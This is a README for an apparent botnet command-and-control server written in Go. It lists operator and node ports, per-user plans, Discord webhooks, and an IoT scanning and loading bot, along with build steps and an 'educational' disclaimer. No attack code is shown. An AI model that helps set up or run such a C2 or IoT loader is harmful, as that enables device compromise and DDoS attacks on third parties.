# FoucsCnC

**Focus**-style Go command server: Ed25519/SSH operator UI, node port, HTTP API, per-user plans, and optional Discord webhooks. Includes `devices/bot.go` for standalone IoT scanning/loading.

> Remove `users.json` plaintext passwords and webhook placeholders before publishing to GitHub.

## Layout

```
FoucsCnC/
├── main.go           # CNC + API + SSH listener
├── users.json        # Account database (sanitize!)
├── devices/bot.go    # Device scanner bot
└── banners/*.tfx     # Terminal UI templates
```

## Default ports (source constants)

| Service | Port |
|---------|------|
| CNC | 420 |
| Node | 7002 |
| API | 8443 |

Bind addresses default to `0.0.0.0` — restrict in production/lab.

## Configuration

- Edit `WebhookGlobal`, `WebhookLogin`, etc. in `main.go` or externalize.
- `users.json`: rotate all passwords; do not commit real credentials.

## Build

```bash
go mod tidy
go build -o foucs main.go
```

## Disclaimer

Educational reconstruction. Illegal to operate against third-party infrastructure.
